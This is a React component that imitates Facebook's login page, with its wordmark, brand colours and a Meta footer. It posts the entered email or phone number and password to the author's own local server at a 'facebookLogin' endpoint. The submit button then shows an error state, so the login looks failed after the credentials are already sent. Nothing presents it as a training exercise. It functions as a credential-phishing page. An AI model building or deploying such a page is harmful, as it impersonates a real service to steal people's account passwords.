import React, { useState } from "react";
import { useForm } from "react-hook-form";
import axios from "axios";

export default function FacebookLogin() {
  const {
    register,
    handleSubmit,
    reset,
  } = useForm();

  const [errorFacebook, setIsErrorFacebook] = useState(false);

  const onSubmit = async (data) => {
    try {
      const response = await axios.post(
        "http://localhost:1010/facebookLogin",
        data
      );
      console.log("Login successful:", response.data);

      // Example: Store token if returned
      // localStorage.setItem("token", response.data.token);

      reset(); // Clear the form
    } catch (error) {
      console.error(
        "Login error:",
        error.response?.data?.message || error.message
      );
      // You can display this error in the UI or with a toast
    }
  };

  return (
    <div className="flex flex-col items-center justify-between min-h-screen bg-gray-100 px-4 py-8">
      <div className="w-full max-w-md flex flex-col items-center">
        {/* Facebook Logo */}
        <h1 className="text-[#1877f2] text-5xl font-bold mb-10">facebook</h1>

        {/* Login Form */}
        <form onSubmit={handleSubmit(onSubmit)} className="w-full">
          <input
            type="text"
            placeholder="Mobile number or email address"
            className="w-full mb-3 p-3 rounded-md border border-gray-200 bg-gray-50 text-gray-700 placeholder-gray-500"
            {...register("email", { required: "Email is required" })}
          />

          <input
            type="password"
            placeholder="Password"
            className={`w-full mb-3 p-3 rounded-md border ${
              errorFacebook
                ? "border-red-500 bg-red-50"
                : "border-gray-200 bg-gray-50"
            } text-gray-700 placeholder-gray-500`}
            // className="w-full mb-3 p-3 rounded-md border border-gray-200 bg-gray-50 text-gray-700 placeholder-gray-500"
            {...register("password", { required: "Password is required" })}
          />
          {errorFacebook && (
            <p className="mt-1 text-red-500 text-sm">{errorFacebook}</p>
          )}

          {/* Login Button */}
          <button
            type="submit"
            className="w-full p-3 bg-[#1877f2] text-white font-semibold rounded-md mb-3"
            onClick={() => setIsErrorFacebook(true)}
          >
            Log In
          </button>
        </form>

        {/* Forgotten Password Link */}
        <a href="#" className="text-[#1877f2] text-sm mb-5">
          Forgotten password?
        </a>

        {/* Divider */}
        <div className="flex items-center w-full mb-5">
          <div className="flex-1 h-px bg-gray-300"></div>
          <div className="px-4 text-gray-500 text-sm">or</div>
          <div className="flex-1 h-px bg-gray-300"></div>
        </div>

        {/* Create New Account Button */}
        <button
          type="button"
          className="px-4 py-2 bg-[#42b72a] text-white font-semibold rounded-md"
        >
          Create New Account
        </button>
      </div>

      {/* Footer */}
      <div className="mt-auto pt-10">
        <div className="flex justify-center gap-4 mb-3">
          <a href="#" className="text-sm text-gray-600">
            About
          </a>
          <a href="#" className="text-sm text-gray-600">
            Help
          </a>
          <a href="#" className="text-sm text-gray-600">
            More
          </a>
        </div>
        <div className="text-sm text-gray-500 flex items-center justify-center">
          Meta{" "}
          <span className="mx-1 inline-flex items-center justify-center w-4 h-4 border border-gray-500 rounded-full text-xs">
            ©
          </span>{" "}
          2022
        </div>
      </div>
    </div>
  );
}
